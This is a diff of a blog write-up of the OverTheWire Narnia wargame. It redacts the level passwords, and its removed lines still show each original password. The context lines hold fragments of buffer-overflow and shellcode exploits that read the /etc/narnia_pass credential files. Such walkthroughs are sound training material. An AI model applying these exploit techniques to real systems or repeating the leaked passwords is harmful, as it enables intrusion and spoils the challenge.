@@ -16,7 +16,8 @@ thought I'd try and tackle it on my day off.
 ![otw-logo]({{ site.baseurl }}/img/otw-narnia/otw-logo.png)
 
 _Warning: this blog post contains solutions to the [Narnia] wargame. If you're
-interested in solving it yourself DO NOT READ THIS._
+interested in solving it yourself DO NOT READ THIS. Passwords have been
+redacted with XXXXXXXXXX._
 
 ### Challenges
 
@@ -93,7 +94,7 @@ narnia0@melinda:/narnia$ (python -c 'print "A"*20+"\xef\xbe\xad\xde"'; echo "cat
 Correct vals value from 0x41414141 -> 0xdeadbeef!
 Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
 val: 0xdeadbeef
-efeidiedae
+XXXXXXXXXX
 narnia0@melinda:/narnia$ 
 {% endhighlight %}
 
@@ -145,7 +146,7 @@ Trying to execute EGG!
 $ id
 uid=14001(narnia1) gid=14001(narnia1) euid=14002(narnia2) groups=14002(narnia2),14001(narnia1)
 $ cat /etc/narnia_pass/narnia2
-nairiepecu
+XXXXXXXXXX
 {% endhighlight %}
 
 Another one down.
@@ -247,7 +248,7 @@ narnia2@melinda:/narnia$ EGG=`python /tmp/docilelumberjack/egg.py` ./narnia2 `py
 $ id
 uid=14002(narnia2) gid=14002(narnia2) euid=14003(narnia3) groups=14003(narnia3),14002(narnia2)
 $ cat /etc/narnia_pass/narnia3
-vaequeezee
+XXXXXXXXXX
 {% endhighlight %}
 
 On to level4.
@@ -312,7 +313,7 @@ narnia3@melinda:/tmp/ambitiousghost$ touch narnia4
 narnia3@melinda:/tmp/ambitiousghost$ /narnia/narnia3 /././././././../etc/narnia_pass/narnia4
 copied contents of /././././././../etc/narnia_pass/narnia4 to a safer place... (narnia4)
 narnia3@melinda:/tmp/ambitiousghost$ cat narnia4 
-thaenohtai
+XXXXXXXXXX
 ���4�}0,narnia3@melinda:/tmp/ambitiousghost$ 
 {% endhighlight %}
 
@@ -396,7 +397,7 @@ narnia4@melinda:/tmp/intricatetrigger$ /narnia/narnia4 `python exploit.py`
 $ id
 uid=14004(narnia4) gid=14004(narnia4) euid=14005(narnia5) groups=14005(narnia5),14004(narnia4)
 $ cat /etc/narnia_pass/narnia5
-faimahchiy
+XXXXXXXXXX
 {% endhighlight %}
 
 There we go.
@@ -463,7 +464,7 @@ Change is value from 1 -> 500. GOOD
 $ id   
 uid=14005(narnia5) gid=14005(narnia5) euid=14006(narnia6) groups=14006(narnia6),14005(narnia5)
 $ cat /etc/narnia_pass/narnia6
-neezocaeng
+XXXXXXXXXX
 {% endhighlight %}
 
 ## Level6 &rarr; Level7 {#level7}
@@ -554,7 +555,7 @@ narnia6@melinda:/narnia$ ./narnia6 `python -c 'print "A"*8+"\x70\x2e\xe6\xf7"'` 
 $ id
 uid=14006(narnia6) gid=14006(narnia6) euid=14007(narnia7) groups=14007(narnia7),14006(narnia6)
 $ cat /etc/narnia_pass/narnia7
-ahkiaziphu
+XXXXXXXXXX
 {% endhighlight %}
 
 ## Level7 &rarr; Level8 {#level8}
@@ -689,7 +690,7 @@ I guess you want to come to the hackedfunction...
 Way to go!!!!$ id
 uid=14007(narnia7) gid=14007(narnia7) euid=14008(narnia8) groups=14008(narnia8),14007(narnia7)
 $ cat /etc/narnia_pass/narnia8
-mohthuphog
+XXXXXXXXXX
 {% endhighlight %}
 
 On to the final challenge.
@@ -769,7 +770,7 @@ ABCDEFGHIJKLMNOPQRST��AAAAAAAAAAAA����
 $ id
 uid=14008(narnia8) gid=14008(narnia8) euid=14009(narnia9) groups=14009(narnia9),14008(narnia8)
 $ cat /etc/narnia_pass/narnia9
-eiL5fealae
+XXXXXXXXXX
 {% endhighlight %}
 
 Success, and that's the end of the [Narnia] wargame.
